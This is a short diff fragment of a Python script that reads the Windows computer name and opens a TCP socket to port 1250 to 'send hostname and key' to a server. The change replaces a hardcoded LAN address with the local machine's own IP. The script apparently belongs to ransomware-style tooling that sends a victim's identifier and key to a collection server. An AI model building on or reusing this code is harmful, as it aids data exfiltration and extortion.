@@ -40,7 +40,10 @@ Hostname=os.getenv('COMPUTERNAME')
 
 #Connect to the sever to send hostname and key
 
-ip_address='192.168.0.103'
+host_name = socket.gethostname()
+IPAddress = socket.gethostbyname(host_name)
+
+ip_address= IPAddress
 port = 1250
 time=datetime.now()
 with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as soc:
